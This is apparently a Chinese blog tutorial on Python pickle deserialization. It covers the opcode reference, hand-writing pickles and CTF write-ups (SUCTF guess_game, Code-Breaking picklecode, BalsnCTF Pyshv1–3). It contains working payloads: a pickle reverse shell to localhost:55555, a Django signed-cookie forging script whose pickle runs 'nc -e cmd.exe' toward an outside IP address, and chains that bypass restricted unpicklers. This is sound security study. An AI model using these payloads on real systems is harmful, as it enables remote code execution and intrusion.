date: 2019-12-27
categories:
- web
tags:
- python
- ctf
- web
title:  python  pickle 入门
---
# python pickle



## 推荐文章

 https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf 

z牛: https://www.anquanke.com/post/id/188981 



## pickle操作码大全(v0)

有啥不懂的直接看源码把(z牛)

```python

MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py

```



## pickle介绍



### pickle的大致过程

以Foo类为例

1. 提取出Foo类中的所有attribute(从`__dict__`中获得)将其转化为键值对
2. 写入对象类名
3. 写入第一步生成的键值对

### unpickle的大致过程

1. 获取pickle流
2. 重新构建属性列表
3. 根据保存的类名来创建对象
4. 将属性列表恢复到对象中



### pvm组成(解析pickle)

1. 指令解释器
   最后一步一定是返回栈顶元素
2. 栈 
3. memo(临时保存数据)
   用类似list的方式来读取和储存数据,以字典方式实现
   如p100,意为把栈顶元素保存到memo中索引为100



### pvm指令格式

1. pvm的操作码只有一个字节

2. 需要参数的操作码,要在每一个参数后面加上换行符
3. 从pickle流中读取数据,并加载到栈上



## 如何生成pickle

### 操作码

#### 加载数据



| 操作码 | 助记    | 加载到栈上的数据类型 | 示例        |
| ------ | ------- | -------------------- | ----------- |
| S      | string  | String               | S'foo'\n    |
| V      | unicode | unicode              | Vfo\u006f\n |
| I      | int     | int                  | I42\n       |
|        |         |                      |             |

#### 修改栈/memo

| 操作码            | 助记 | 描述                       | 示例   |
| ----------------- | ---- | -------------------------- | ------ |
| (                 | MARK | 向栈中加入一个标记         | (      |
| 0                 | POP  | 弹出栈顶元素并丢弃         | 0      |
| p`<memo_index>`\n | PUT  | 复制栈顶元素到memo中       | p101\n |
| g`<memo_index>`\n | GET  | 将memo中指定元素拷贝到栈顶 | g101\n |



#### 生成/修改列表,字典,元组

| 操作码 | 助记    | 描述                                                         | 示例                                                    |
| ------ | ------- | ------------------------------------------------------------ | ------------------------------------------------------- |
| l      | 列表    | 将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中 | (S'string'\nl                                           |
| t      | 元组    | 将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中 | (S'string'\nS'string2'\nt                               |
| d      | 字典    | 将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中 | (S'key1'\nS'value1'\nS'key2'\nS'value2'\nd              |
| s      | SETITEM | 从栈出弹出三个值:字典,键,值,将键值对合并到字典中             | (S'key1'\nS'val1'\nS'key2'\nI123\ndS'key3'\nS'val 3'\ns |
|        |         |                                                              |                                                         |

#### pickle 流生成元组的过程

- 生成元组的指令

  ```
  (S'str1'
  S'str2'
  I1234
  t
  ```

- 生成元组的过程图

![image5192](https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg)



#### 加载对象

| 操作码 | 助记   | 描述                                                         | 示例                          |
| ------ | ------ | ------------------------------------------------------------ | ----------------------------- |
| c      | GLOBAL | 需要两个参数(module,class)来创建对象,并将其放到栈中          | cos\nsystem\n                 |
| R      | REDUCE | 弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中 | cos\nsystem\n(S'sleep 10'\ntR |

#### 加载对象过程图

![image5725](https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg)



![image5808](https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg)

![image5889](https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg)

![image5970](https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg)

![image6051](https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg)

![image6132](https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg)







## 编写pickle的一些技巧

我们如何执行如下的代码:

```python
f=open('/path/to/massive/sikrit') 
f.read()
```

思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()

`f.read()`可以等价替换成` __builtin__.apply( __builtin__.getattr(file,'read'), [f]) `

最后合成的pickle是

```
#step1
c__builtin__
open
(S'/path/to/massive/sikrit'
tRp100
#step2
c__builtin__
apply
(c__builtin__
getattr
(c__builtin__
file
S'read'
tR(g100
ltR.
```



### 手写pickle模板



![image6628](https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg)





### 利用`__reduce__`来生成pickle代码

`__reduce__`



> 当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 __reduce__ 被定义之后，当对象被Pickle时就会被调用。 



```python
import os, pickle
class Test(object):
    def __reduce__(self):
        return (os.system,('ls',))
    
print(pickle.dumps(Test(), protocol=0))
```



### 利用marshal和cPickle来生成代码

```python
# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'

import marshal
import base64
import cPickle
import urllib
import pickle

def foo():#you should write your code in this function
    import os
    def fib(n):
        if n <= 1:
            return n
        return fib(n-1) + fib(n-2)
    print 'fib(10) =', fib(10)
    os.system('dir')

code_serialized = base64.b64encode(marshal.dumps(foo.func_code))


#为了保证code_serialized中的内容得到执行，我们需要如下代码
#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), ''))()

payload =  """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))
print(payload)
```



## 经验



### 通过源码查看pickle的方法

直接所有操作码对应的变量



![image7895](https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png)





` dispatch[BININT1[0]] = load_binint1`

找到类似这种的后面的就是对应的函数

## pickle工具

 [converttopickle.py]( https://github.com/sensepost/anapickle )

  

## payload

 https://github.com/sensepost/anapickle/blob/master/anapickle.py 



### 反弹shell

```python
'''csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS'__getitem__'\ntRp102\n0g102\n(S'AF_INET'\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS'__getitem__'\ntRp105\n0g105\n(S'SOCK_STREAM'\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS'__getitem__'\ntRp108\n0g108\n(S'IPPROTO_TCP'\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS'__getitem__'\ntRp111\n0g111\n(S'SOL_SOCKET'\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS'__getitem__'\ntRp114\n0g114\n(S'SO_REUSEADDR'\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'setsockopt'\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'connect'\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S'localhost'\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS'fileno'\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S'/bin/bash'\ntI0\nS'/bin/bash'\ng122\ng122\ng122\ntRp123\n0S'finished'\n.'''
```

localhost:55555



## 注意

1. 使用v0版的pickle协议,保证shellcode的通用性



## 例题

### suctf guess_game

[题目链接]( https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game )

考点:pickle

代码审计一波后

如果猜对10次后会给flag(机会只有10次)

因为知道是考pickle直接全局搜索pickle发现在server处有

`ticket = restricted_loads(ticket)`

其中ticket是我们可控点

跟进去看

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe classes
        if "guess_game" == module[0:10] and "__" not in name:
            return getattr(sys.modules[module], name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

我们只能加载guess_game中的类,并且不能调用魔术方法.

在这一题中拿到flag有两种方式:

1. 命令执行
2. 通过游戏

在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了

而游戏中判定赢的条件是

```python
class Game
	def is_win(self):
        return self.win_count == max_round
```

如果我们能直接修改win_count或者max_round就可以拿到flag了

我们发现在`guess_game`中已经有一个`game = Game()`这个了,也就是我们可以利用pickle来加载这个game直接修改

那么接下来就是如何修改了

在pickle的操作码中我们发现

`BUILD          = b'b'   # call __setstate__ or __dict__.update()`这一条

其中update()就可以修改game的属性了

那么接下来就只有一个问题了,操作码`b`如何使用

一路跟踪发现b操作码的实现

```python
    def load_build(self):
        stack = self.stack
        state = stack.pop()
        inst = stack[-1]
        setstate = getattr(inst, "__setstate__", None)
        if setstate is not None:
            setstate(state)
            return
        slotstate = None
        if isinstance(state, tuple) and len(state) == 2:
            state, slotstate = state
        if state:
            inst_dict = inst.__dict__
            intern = sys.intern
            for k, v in state.items():
                if type(k) is str:
                    inst_dict[intern(k)] = v
                else:
                    inst_dict[k] = v
        if slotstate:
            for k, v in slotstate.items():
                setattr(inst, k, v)
```

没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象

最后的payload:

```python
b"cguess_game\ngame\n(S'win_count'\nI10\nS'round_count'\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb."
```



### code breaking picklecode



[题目链接]( https://github.com/phith0n/code-breaking/blob/master/2018/picklecode )

代码审计发现在index处可以ssti

```python
def index(request):
    django_engine = engines['django']
    template = django_engine.from_string('My name is ' + request.user.username)

    return HttpResponse(template.render(None, request))
```

但是django难以利用ssti命令执行但是能读取敏感配置

结合serializer.py

```python
class RestrictedUnpickler(pickle.Unpickler):
    blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == "builtins" and name not in self.blacklist:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))


class PickleSerializer():
    def dumps(self, obj):
        return pickle.dumps(obj)

    def loads(self, data):
        try:
            if isinstance(data, str):
                raise TypeError("Can't load pickle from unicode string")
            file = io.BytesIO(data)
            return RestrictedUnpickler(file,
                              encoding='ASCII', errors='strict').load()
        except Exception as e:
            return {}
```

和setting文件里的特殊配置

```python
SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'
SESSION_SERIALIZER = 'core.serializer.PickleSerializer'
```

查阅django文档发现

 https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions 

可以确定,这里是通过读取secret_key来构造恶意cookie来pickle反序列化命令执行



我们跟进django.contrib.sessions.backends.signed_cookies来了解如何生成储存session的cookie(这里花了我很久的时间,从尝试看一步一步调试到看调用堆栈再到查文档最后才搞清楚过程,建议自己尝试)

在理解之后便有一下生成恶意cookie的代码

```python
import base64
import datetime
import json
import re
import time
import zlib
import pickle
from django.utils import baseconv
from django.utils.crypto import constant_time_compare, salted_hmac
from django.utils.encoding import force_bytes
from django.utils.module_loading import import_string
from django import core
from django.core import signing


myexp=b'''cbuiltins
globals
(tRp100
cbuiltins
getattr
p101
(g100
S'get'
tR(S'builtins'
tRp103
g101
(g103
S'eval'
tR(S'eval(\'\'\'__import__('os').system('nc -e "cmd.exe /K" 39.108.164.219 60000 -d')\'\'\')'
tR.'''
def pickle_exp(SECRET_KEY):
    data = myexp
    compress=True
    # Flag for if it's been compressed or not
    is_compressed = False
    salt='django.contrib.sessions.backends.signed_cookies'
    if compress:
        # Avoid zlib dependency unless compress is being used
        compressed = zlib.compress(data)
        if len(compressed) < (len(data) - 1):
            data = compressed
            is_compressed = True
    base64d = signing.b64_encode(data).decode()
    if is_compressed:
        base64d = '.' + base64d
    print(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))


pickle_exp("asdasdasdasdas")

```

接下来就是如何构造恶意的pickle代码的问题了

题目限制了只能加载builtins里的属性

且属性名不能为以下内容

```
blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}
```

利用`__reduce__`来生成pickle代码已经无法满足要求了,我们不得不手写pickle代码,怎么手写就不详细讲了

我们现在把目光聚焦在如何构造利用链上



builtins的属性(删除部分)

```python
['_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```

我们查看builtins的属性我们发现两个有意思的东西,一个是getattr,另一个是globals

虽然限制我们属性名不能为eval啥的,但是并没有限制不能出现在参数处

所以`getattr(builtins,"eval")`便能得到eval方法了

但是看pickle的操作码并没有发现能直接导入一个模块的操作,在结合globals我们很容易想到`getattr(getattr(globals(),"builtins"),"eval")`

最后的payload:`builtins.getattr(builtins.getattr(builtins.globals(),"builtins"),"eval")("evil code")`

其对应的pickle代码是

```python
b'''cbuiltins
globals
(tRp100
cbuiltins
getattr
p101
(g100
S'get'
tR(S'builtins'
tRp103
g101
(g103
S'eval'
tR(S'eval(\'\'\'__import__('os').system('nc -e "cmd.exe /K" 39.108.164.219 60000 -d')\'\'\')'
tR.'''
```

最后就差secret_key了,看别人的wp都是调试易得易得secret_key//

但是我是没找到,于是自己写了个过滤器

递归查找settings

```python
from django.http.response import HttpResponse, HttpResponseRedirect
from django.template import engines
from django.contrib.auth import login as auth_login, get_user_model, authenticate
from django.contrib.auth.views import LoginView, logout_then_login
from django.contrib.auth.decorators import login_required
from django.views import generic
from django import template

import django
from django import template
register = template.Library()

@register.filter
def get_dict(obj,way="",depth=0):
    if depth>11:
        return 
    objdir=dir(obj)
    r={"dict":objdir,"way":way}
    result=""
    
    for i in objdir:            
        try :
            if '_' == i[0]:
                continue
            if getattr(obj, '__module__', None)!=None and getattr(obj, '__module__', None).split('.')[0] == django.__name__:
                result+=get_dict(getattr(obj,i,None),way+"."+i,depth+1) 
        except TypeError:
            pass

    if "SECRET_KEY" in objdir or "settings" in objdir:
        print(way)
        return result+way+"\n"
    return result
```

这次是真的易得了:),至此结束





### BalsnCTF 2019 Pyshv1

 ```python
#!/usr/bin/python3 -u

import securePickle as pickle
import codecs


pickle.whitelist.append('sys')


class Pysh(object):
    def __init__(self):
        self.login()
        self.cmds = {}

    def login(self):
        user = input().encode('ascii')
        user = codecs.decode(user, 'base64')
        user = pickle.loads(user)
        raise NotImplementedError("Not Implemented QAQ")

    def run(self):
        while True:
            req = input('$ ')
            func = self.cmds.get(req, None)
            if func is None:
                print('pysh: ' + req + ': command not found')
            else:
                func()


if __name__ == '__main__':
    pysh = Pysh()
    pysh.run()
 ```

```python
import pickle
import io


whitelist = []


# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or '.' in name:
            raise KeyError('The pickle is spoilt :(')
        return pickle.Unpickler.find_class(self, module, name)


def loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()


dumps = pickle.dumps
```

只允许sys里的属性,而且属性里不能有.

```
['__displayhook__', '__doc__', '__excepthook__', '__interactivehook__', '__loader__', '__name__', '__package__', '__spec__', '__stderr__', '__stdin__', '__stdout__', '_clear_type_cache', '_current_frames', '_debugmallocstats', '_getframe', '_git', '_home', '_xoptions', 'abiflags', 'api_version', 'argv', 'base_exec_prefix', 'base_prefix', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_wrapper', 'getallocatedblocks', 'getcheckinterval', 'getdefaultencoding', 'getdlopenflags', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'last_traceback', 'last_type', 'last_value', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'ps1', 'ps2', 'set_asyncgen_hooks', 'set_coroutine_wrapper', 'setcheckinterval', 'setdlopenflags', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdout', 'thread_info', 'version', 'version_info', 'warnoptions']

```



发现有个modules,但是loads那里有一个死亡raise

` sys._getframe` 可以返回带有exec的字典,但是好像没啥用

现在问题是不知道如何取出modules里的值

阅读文档发现

>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. 

可以修改modules来修改模块内容

```shell
>>> import sys
>>> sys.modules['sys']=sys.modules
>>> import sys
>>> dir(sys)
['__class__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'copy', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']
```

然后sys就被替换成sys.modules了,就可以拿到os了

然后再对sys.modules['sys']再赋值为os

就可以import os了

(师傅们tql)

构造payload

```
csys
modules
S'sys'
csys
modules
p100
scsys
get
(S'os'
tRp101
g100
S'sys'
g101
scsys
system
(S'dir'
tR.
```





### BalsnCTF 2019 Pyshv2



```python
#!/usr/bin/python3 -u

import securePickle as pickle
import codecs


pickle.whitelist.append('structs')


class Pysh(object):
    def __init__(self):
        self.login()
        self.cmds = {
            'help': self.cmd_help,
            'flag': self.cmd_flag,
        }

    def login(self):
        user = input().encode('ascii')
        user = codecs.decode(user, 'base64')
        user = pickle.loads(user)
        raise NotImplementedError("Not Implemented QAQ")

    def run(self):
        while True:
            req = input('$ ')
            func = self.cmds.get(req, None)
            if func is None:
                print('pysh: ' + req + ': command not found')
            else:
                func()

    def cmd_help(self):
        print('Available commands: ' + ' '.join(self.cmds.keys()))

    def cmd_su(self):
        print("Not Implemented QAQ")
        # self.user.privileged = 1

    def cmd_flag(self):
        print("Not Implemented QAQ")


if __name__ == '__main__':
    pysh = Pysh()
    pysh.run()
```



这次更骚了直接给了个空模块

```shell
>>> dir(structs)
['__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__']
```



`__spec__,__loader__,__builtins__`是我们需要注意的

我们看一下操作码c(看重载后的find_class代码,看别人wp的时候没看重载后的find_class,然后连wp都看不懂了)的实现,发现调用了`__import__`

在文档中发现



> 此函数(`__import__`)会由 [`import`](https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import) 语句发起调用。 它可以被替换 (通过导入 [`builtins`](https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins) 模块并赋值给 `builtins.__import__`) 以便修改 `import` 语句的语义 



而`__buiutins__`里面也有`__import__`



```
>>> structs.__builtins__['__import__']=eval
>>> import os
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: eval expected at most 3 arguments, got 5
>>> __import__('print(123)')
123
```



成功修改了`__import__`

我们再看重载的find_class

securePickle.py

```python
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or '.' in name:
            raise KeyError('The pickle is spoilt :(')
        module = __import__(module)
        return getattr(module, name)
#一般重载都会改成if xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)

```

而原来的find_class是这样的

```python
def find_class:
    __import__(module, level=0)
	return getattr(sys.modules[module], name)
```



接着我们可以通过操作码c来实现一下操作

```python
return getattr(__import__(module), name)
```

如果能令`__import__(module)`的返回值为`__builtins__`时,就可以取出`__builtins__`里的值



结合[魔术方法]( https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1 )`__getattribute__`便可以实现

于是构造

```python
bis=structs.__builtins__
structs.__setattr__('structs',bis)#name只能为structs
bis['__import__']=structs.__getattribute__
getattr(__import__("structs"),"get")("eval")("print(123)")
```



对应的pickle代码

```
cstructs
__builtins__
p100
0cstructs
__setattr__
(S'structs'
g100
tRg100
S'__import__'
cstructs
__getattribute__
scstructs
get
(S"eval"
tR(S'print(123)'
tR.
```







### BalsnCTF 2019 Pyshv3



structs.py

```python
class User(object):
    def __init__(self, name, group):
        self.name = name
        self.group = group
        self.isadmin = 0
        self.prompt = ''
```



```python
import pickle
import io


whitelist = []


# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or '.' in name:
            raise KeyError('The pickle is spoilt :(')
        return pickle.Unpickler.find_class(self, module, name)


def loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()


dumps = pickle.dumps
```



server.py



```python
import securePickle as pickle
import codecs
import os


pickle.whitelist.append('structs')


class Pysh(object):
    def __init__(self):
        self.key = os.urandom(100)
        self.login()
        self.cmds = {
            'help': self.cmd_help,
            'whoami': self.cmd_whoami,
            'su': self.cmd_su,
            'flag': self.cmd_flag,
        }

    def login(self):
        with open('../flag.txt', 'rb') as f:
            flag = f.read()
        flag = bytes(a ^ b for a, b in zip(self.key, flag))
        user = input().encode('ascii')
        user = codecs.decode(user, 'base64')
        user = pickle.loads(user)
        print('Login as ' + user.name + ' - ' + user.group)
        user.privileged = False
        user.flag = flag
        self.user = user

    def run(self):
        while True:
            req = input('$ ')
            func = self.cmds.get(req, None)
            if func is None:
                print('pysh: ' + req + ': command not found')
            else:
                func()

    def cmd_help(self):
        print('Available commands: ' + ' '.join(self.cmds.keys()))

    def cmd_whoami(self):
        print(self.user.name, self.user.group)

    def cmd_su(self):
        print("Not Implemented QAQ")
        # self.user.privileged = 1

    def cmd_flag(self):
        if not self.user.privileged:
            print('flag: Permission denied')
        else:
            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))


if __name__ == '__main__':
    pysh = Pysh()
    pysh.run()
```



如果我们想拿到flag,要么命令执行直接拿flag要么就令`user.privileged=True` 调用cmd_flag来拿flag

但是再反序列化处

```python
		user = pickle.loads(user)
        print('Login as ' + user.name + ' - ' + user.group)
        user.privileged = False
```

`user.privileged`会被覆盖为False,再康康其他的信息把

`dir(structs)`:

```python
['User', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__']
```

---

几个小时后,看wp学成归来.

我:艹,太骚了,师傅们牛逼死了

---

之前说有两个解题思路,命令执行这一个思路在看了一会之后就觉得不太行,毫无头绪

再康康让`user.privileged=False`失效这一思路,emmmm感觉也不太行.

但是,类的赋值肯定会受到一些特殊函数的影响

在研究类的赋值的时候可以找到[描述符]( https://foofish.net/what-is-descriptor-in-python.html )可以自定义赋值函数

那么如果我们能让User的`__set__`变成一个接受3个参数的函数,就可以令`user.privileged=False`无效

但是很显然pickle里是无法直接编写代码的,令`__set__=""`?更不行,会直接报错



继续阅读代码我们会发现一个神奇的东西

```python
class User(object):
    def __init__(self, name, group):
        self.name = name
        self.group = group
        self.isadmin = 0
        self.prompt = ''
        print("name:%s ,group:%s"%(name,group))
```

`User.__init__`刚好接受三个参数

我们能不能让`__set__=User`?,然后调用`__set__`的时候调用`User.__init__`

```python
>>> setattr(User,'test',User(123,123))
name:123 ,group:123
>>> setattr(User,"__set__",User)
>>> b=User(123,123)
name:123 ,group:123
>>> b.test=123123
name:<structs.User object at 0x0000017BA1538748> ,group:123123
```



于是构造:

```python
a=__import__("structs").User
b=User("123","456")
setattr(a,"privileged",b)
setattr(a,"__set__",a)
return b
```

对应的pickle代码为

```
cstructs
User
p100
(S"123"
S"456"
tRp101
g100
(N}S'privileged'
g101
sS'__set__'
g100
stbg101
.
```



```
$ help
Available commands: help whoami su flag
$ whoami
123 456
$ flag
b'Balsn{pY7h0n1dae_ObJ3c7}\n'
```

hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh









## 参考

 https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf 

https://www.anquanke.com/post/id/188981 

 http://www.polaris-lab.com/index.php/archives/178/ 

 https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html 

 https://xz.aliyun.com/t/5306 